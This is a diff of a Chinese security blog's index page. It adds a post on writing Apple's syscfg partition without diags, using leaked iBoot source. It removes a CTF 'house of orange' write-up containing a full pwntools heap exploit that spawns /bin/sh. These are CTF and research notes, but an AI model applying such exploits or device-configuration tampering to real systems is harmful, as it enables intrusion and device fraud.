@@ -75,6 +75,68 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-关于Apple产品的无diags修改Syscfg分区" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/02/18/%E5%85%B3%E4%BA%8EApple%E4%BA%A7%E5%93%81%E7%9A%84%E6%97%A0diags%E4%BF%AE%E6%94%B9Syscfg%E5%88%86%E5%8C%BA/" class="article-date">
+  <time class="dt-published" datetime="2026-02-18T01:42:36.000Z" itemprop="datePublished">2026-02-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/02/18/%E5%85%B3%E4%BA%8EApple%E4%BA%A7%E5%93%81%E7%9A%84%E6%97%A0diags%E4%BF%AE%E6%94%B9Syscfg%E5%88%86%E5%8C%BA/">关于Apple产品的无diags修改Syscfg分区</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>请注意:讨论任何有关AppleInternal(苹果内部软件)的文章都是不合法的,在此讨论仅为学术研究</strong></p>
+<p>最近闲下来的时候发现了一个很有意思的软件(XPod),据说它可以不使用diags(苹果内部使用的镜像，通常出现在DVT&#x2F;EVT等工程设备中)，来修改syscfg分区。</p>
+<blockquote>
+<p>From <a target="_blank" rel="noopener" href="https://www.reddit.com/r/setupapp/comments/t615ii/xpod_tool_working_fine_on_ipod_5th_gen/">https://www.reddit.com/r/setupapp/comments/t615ii/xpod_tool_working_fine_on_ipod_5th_gen/</a></p>
+</blockquote>
+<p><img src="/./%E5%85%B3%E4%BA%8EApple%E4%BA%A7%E5%93%81%E7%9A%84%E6%97%A0diags%E4%BF%AE%E6%94%B9Syscfg%E5%88%86%E5%8C%BA/image-20260218094648007.png" alt="image-20260218094648007"></p>
+<p>一番查找，我找到了它的安装包并对其进行逆向工程。发现了很有意思的两条命令</p>
+<p><img src="/./%E5%85%B3%E4%BA%8EApple%E4%BA%A7%E5%93%81%E7%9A%84%E6%97%A0diags%E4%BF%AE%E6%94%B9Syscfg%E5%88%86%E5%8C%BA/image-20260218094831609.png" alt="image-20260218094831609"></p>
+<p>bdev命令 这到底是什么命令呢？</p>
+<blockquote>
+<p>From <a target="_blank" rel="noopener" href="https://theapplewiki.com/wiki/IBSS_commands">https://theapplewiki.com/wiki/IBSS_commands</a></p>
+</blockquote>
+<p><img src="/./%E5%85%B3%E4%BA%8EApple%E4%BA%A7%E5%93%81%E7%9A%84%E6%97%A0diags%E4%BF%AE%E6%94%B9Syscfg%E5%88%86%E5%8C%BA/image-20260218094928139.png" alt="image-20260218094928139"></p>
+<p>我们可以看到他是用与块设备的，那么肯定就是在iBSS里面了，大概率我们可以推测出是使用的iBEC的命令(Pwned iDevice需要发送pwnedibss)。那么就肯定和苹果泄露iBoot源码有关系了。</p>
+<p>我找到了一份iBoot源码开始研究。</p>
+<blockquote>
+<p>待施工</p>
+</blockquote>
+<p>在修改完众多文件与接管panic之后，我们已经可以写入syscfg分区了。</p>
+<p><img src="/./%E5%85%B3%E4%BA%8EApple%E4%BA%A7%E5%93%81%E7%9A%84%E6%97%A0diags%E4%BF%AE%E6%94%B9Syscfg%E5%88%86%E5%8C%BA/image-20260218095433425.png" alt="image-20260218095433425"></p>
+<p>驱动显示是读写状态。</p>
+<p><img src="/./%E5%85%B3%E4%BA%8EApple%E4%BA%A7%E5%93%81%E7%9A%84%E6%97%A0diags%E4%BF%AE%E6%94%B9Syscfg%E5%88%86%E5%8C%BA/image-20260218095505719.png" alt="image-20260218095505719"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://b.iakb.org/2026/02/18/%E5%85%B3%E4%BA%8EApple%E4%BA%A7%E5%93%81%E7%9A%84%E6%97%A0diags%E4%BF%AE%E6%94%B9Syscfg%E5%88%86%E5%8C%BA/" data-id="cmlrdrtka001ickuafz08547d" data-title="关于Apple产品的无diags修改Syscfg分区" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AppleInternal/" rel="tag">AppleInternal</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/diags/" rel="tag">diags</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/iDevice/" rel="tag">iDevice</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-i4tools-unauthorized-RCE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/01/28/i4tools-unauthorized-RCE/" class="article-date">
@@ -120,7 +182,7 @@ s.send(<span class="hljs-string">b&#x27;\xE9\x03\x00\x00&#x27;</span> + <span cl
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2026/01/28/i4tools-unauthorized-RCE/" data-id="cmlh5f4fr000s2suac79bc0b3" data-title="i4tools unauthorized RCE" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2026/01/28/i4tools-unauthorized-RCE/" data-id="cmlrdrtk5000uckuabfuwhdyv" data-title="i4tools unauthorized RCE" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -310,7 +372,7 @@ s.send(<span class="hljs-string">b&#x27;\xE9\x03\x00\x00&#x27;</span> + <span cl
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-NISACTF-2022-babyserialize/" data-id="cmlh5f4fn000c2suafp36da4x" data-title="PHP反序列化入门 - [NISACTF 2022]babyserialize" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-NISACTF-2022-babyserialize/" data-id="cmlrdrtk3000ickua6l4w6fbz" data-title="PHP反序列化入门 - [NISACTF 2022]babyserialize" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -399,7 +461,7 @@ s.send(<span class="hljs-string">b&#x27;\xE9\x03\x00\x00&#x27;</span> + <span cl
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-no-wakeup/" data-id="cmlh5f4fo000g2sua294m6f9n" data-title="PHP反序列化入门 - no_wakeup" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-no-wakeup/" data-id="cmlrdrtk10008ckua0cdp8klb" data-title="PHP反序列化入门 - no_wakeup" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -632,7 +694,7 @@ itr()
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/" data-id="cmlh5f4fm00082sua53nefcpd" data-title="2025年广西网络与信息安全职业技能竞赛决赛 pwn writeup" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/" data-id="cmlrdrtk1000ackua0fhm4mt4" data-title="2025年广西网络与信息安全职业技能竞赛决赛 pwn writeup" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -808,7 +870,7 @@ interface myrpc&#123;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/" data-id="cmlh5f4fp000j2sua6vhygtw3" data-title="Windows RPC 初探" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/" data-id="cmlrdrtk3000gckuabw5906k6" data-title="Windows RPC 初探" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -862,7 +924,7 @@ interface myrpc&#123;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/09/17/UEFI-Start-Hello-World/" data-id="cmlh5f4fo000f2sua8kgtc7jo" data-title="UEFI Start - Hello World" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/09/17/UEFI-Start-Hello-World/" data-id="cmlrdrtk2000eckuaaypocy2l" data-title="UEFI Start - Hello World" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -988,7 +1050,7 @@ interface myrpc&#123;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/" data-id="cmlh5f4fs00152suab0gs3iip" data-title="windows 虚拟内存笔记" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/" data-id="cmlrdrtk80017ckuafpys5352" data-title="windows 虚拟内存笔记" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -1046,7 +1108,7 @@ interface myrpc&#123;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/" data-id="cmlh5f4fp000i2sua9mhefxuy" data-title="Wincor Nixdorf PORT IO Driver Stack Overflow" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/" data-id="cmlrdrtk2000dckua0by34l27" data-title="Wincor Nixdorf PORT IO Driver Stack Overflow" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -1156,153 +1218,11 @@ BYTE original_code[<span class="hljs-number">14</span>];
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/05/23/windows-hook-inline-hook/" data-id="cmlh5f4fs00122sua53y20hx2" data-title="windows hook - inline hook" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/05/23/windows-hook-inline-hook/" data-id="cmlrdrtk70014ckua967ga3mh" data-title="windows hook - inline hook" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hook/" rel="tag">hook</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/inline-hook/" rel="tag">inline hook</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/" rel="tag">windows</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-house-of-orange-欧润吉" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/" class="article-date">
-  <time class="dt-published" datetime="2025-05-08T05:32:29.000Z" itemprop="datePublished">2025-05-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/">house of orange(欧润吉)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>通过溢出修改top_chunk的size从而申请比修改后的size更大的chunk来触发sys_malloc，从而把原来的top_chunk给free掉 </p>
-<p>然后就可以泄露LIBC地址和堆地址了</p>
-<p>unsortedbin attack 已经在新版本libc被修复了 </p>
-<pre><code class="hljs C">victim = unsorted_chunks(av)-&gt;bk;  <span class="hljs-comment">// 获取最后一个 chunk</span>
-bck = victim-&gt;bk;                 <span class="hljs-comment">// 获取 victim 的 bk</span>
-unsorted_chunks(av)-&gt;bk = bck;    <span class="hljs-comment">// 将 unsorted bin 的 bk 指向 victim 的 bk</span>
-bck-&gt;fd = unsorted_chunks(av);    <span class="hljs-comment">// 关键操作：将 victim-&gt;bk-&gt;fd 设置为 unsorted bin 头 </span></code></pre>
-
-
-
-<p>我们可以控制最后一个chunk的bk</p>
-<p>因为这个攻击是利用了 往 最后一个chunk 的 bk 的fd (bk+0x10)写入东西</p>
-<p>那么只要控制bk减少0x10 就可以往我们指定的target_address 写入 main_arena+96 或者+88 (一个很大的值)</p>
-<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP:"></a>FSOP:</h2><p>FSOP的核心是去篡改_IO_list_all和_chain，来劫持IO_FILE结构体。让IO_FILE结构体落在我们可控的内存上。然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow</p>
-<p>主要就是为了控制_IO_list_all 然后控制vtable 或者chain</p>
-<h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
-<span class="hljs-comment">#from LibcSearcher import *</span>
-context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
-context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
-<span class="hljs-comment">#io = remote(&quot;node5.buuoj.cn&quot;,29087)</span>
-io = process(<span class="hljs-string">&quot;./orange&quot;</span>)
-e = ELF(<span class="hljs-string">&#x27;./orange&#x27;</span>)
-libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
-	<span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():
-    attach(io)
-
-s       = <span class="hljs-keyword">lambda</span> data               :io.send(data)
-sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
-sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
-sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
-r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
-ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
-itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
-uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
-uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
-ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
-dlog     = <span class="hljs-keyword">lambda</span> name,data         :log.success(<span class="hljs-string">f&quot;get <span class="hljs-subst">&#123;name&#125;</span>=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(data))
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():
-    sla(<span class="hljs-string">b&quot;Your choice : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
-
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):
-    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
-    sla(<span class="hljs-string">&#x27;Length of name :&#x27;</span>,<span class="hljs-built_in">str</span>(size))
-    sa(<span class="hljs-string">&#x27;Name :&#x27;</span>,content)
-    sla(<span class="hljs-string">&#x27;Price of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
-    sla(<span class="hljs-string">&#x27;Color of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
-
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size,content</span>):
-    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
-    sla(<span class="hljs-string">&#x27;Length of name :&#x27;</span>,<span class="hljs-built_in">str</span>(size))
-    sa(<span class="hljs-string">&#x27;Name:&#x27;</span>,content)
-    sla(<span class="hljs-string">&#x27;Price of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
-    sla(<span class="hljs-string">&#x27;Color of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
-
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):
-    sla(<span class="hljs-string">&#x27;4.show\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
-    sla(<span class="hljs-string">&#x27;index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))
-    
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():
-    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
-
-add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)
-edit(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xfa1</span>)) <span class="hljs-comment"># modify top_chunk</span>
-add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)
-add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># cut the free chunk </span>
-show()
-ru(<span class="hljs-string">&#x27;Name of house : &#x27;</span>)
-leak_main_arena = uu64(r(<span class="hljs-number">6</span>))
-dlog(<span class="hljs-string">&quot;main_arena&quot;</span>,leak_main_arena)
-libc_base = leak_main_arena -<span class="hljs-number">0x5e9</span> - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]
-dlog(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)
-io_2_1_list_all = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_list_all&quot;</span>]
-system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]
-dlog(<span class="hljs-string">&quot;list_all&quot;</span>,io_2_1_list_all)
-edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)
-show()
-ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)
-leak_heap_addr = uu64(r(<span class="hljs-number">6</span>))
-dlog(<span class="hljs-string">&quot;heap_address&quot;</span>,leak_heap_addr)
-payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span> + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>
-payload+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0x61</span>)+p64(<span class="hljs-number">0</span>)+p64(io_2_1_list_all-<span class="hljs-number">0x10</span>)<span class="hljs-comment">#unsorted bin attack</span>
-payload+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)
-payload+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>
-payload+=p64(leak_heap_addr+<span class="hljs-number">0x530</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">10</span>
-payload+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(leak_heap_addr+<span class="hljs-number">0x610</span>)+p64(system_addr)*<span class="hljs-number">8</span>
-edit(<span class="hljs-built_in">len</span>(payload),payload)
-<span class="hljs-comment">#bug()</span>
-sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
-
-
-io.interactive()</code></pre>
-
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/" data-id="cmlh5f4fp000l2suaav0v95xh" data-title="house of orange(欧润吉)" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/house-of-orange/" rel="tag">house of orange</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
 
     </footer>
   </div>
@@ -1330,7 +1250,7 @@ io.interactive()</code></pre>
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/" rel="tag">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2025/" rel="tag">2025</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/BOCCHI-THE-ROCK/" rel="tag">BOCCHI THE ROCK</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-file/" rel="tag">IO_file</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RPC/" rel="tag">RPC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UEFI/" rel="tag">UEFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">_IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILEt/" rel="tag">_IO_FILEt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/malloc-hook/" rel="tag">_malloc_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/debug-symbol/" rel="tag">debug-symbol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dirsearch/" rel="tag">dirsearch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastbin/" rel="tag">fastbin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git-leak/" rel="tag">git leak</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glibc/" rel="tag">glibc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/header/" rel="tag">header</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap-feng-shui/" rel="tag">heap_feng_shui</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hook/" rel="tag">hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/house-of-apple2/" rel="tag">house of apple2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/house-of-orange/" rel="tag">house of orange</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/inline-hook/" rel="tag">inline hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/match/" rel="tag">match</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/off-by-one/" rel="tag">off-by-one</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/one-gadget/" rel="tag">one_gadget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/orw/" rel="tag">orw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwngdb/" rel="tag">pwngdb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2csu/" rel="tag">ret2csu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2shellcode/" rel="tag">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2text/" rel="tag">ret2text</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/root/" rel="tag">root</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/safe-linking/" rel="tag">safe-linking</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stdout/" rel="tag">stdout</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcache/" rel="tag">tcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/uaf/" rel="tag">uaf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unauthorized/" rel="tag">unauthorized</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unlink/" rel="tag">unlink</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unserialize/" rel="tag">unserialize</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtual-memory/" rel="tag">virtual memory</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vmware/" rel="tag">vmware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" rel="tag">世界杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" rel="tag">数据泄露</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E5%B8%B8/" rel="tag">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A7%A3%E5%86%B3/" rel="tag">解决</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%97%AE%E9%A2%98/" rel="tag">问题</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/" rel="tag">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2025/" rel="tag">2025</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/AppleInternal/" rel="tag">AppleInternal</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/BOCCHI-THE-ROCK/" rel="tag">BOCCHI THE ROCK</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-file/" rel="tag">IO_file</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RPC/" rel="tag">RPC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UEFI/" rel="tag">UEFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">_IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILEt/" rel="tag">_IO_FILEt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/malloc-hook/" rel="tag">_malloc_hook</a></li><li 